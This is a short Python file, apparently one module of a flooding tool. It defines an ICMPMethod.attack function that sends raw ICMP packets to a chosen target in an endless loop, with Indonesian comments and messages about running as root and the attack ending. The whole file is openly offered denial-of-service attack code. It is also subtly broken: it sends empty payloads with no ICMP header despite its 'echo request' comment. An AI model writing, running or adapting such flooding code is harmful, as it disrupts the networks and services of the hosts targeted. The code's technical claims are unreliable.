import socket

class ICMPMethod:
    @staticmethod
    def attack(target):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while True:
                sock.sendto(b"", (target, 1)) # Mengirim paket ICMP "echo request"
        except PermissionError:
            print("Anda perlu menjalankan skrip sebagai root atau administrator.")
        except:
            print("Serangan selesai atau target tidak dapat dijangkau.")
        finally:
            sock.close()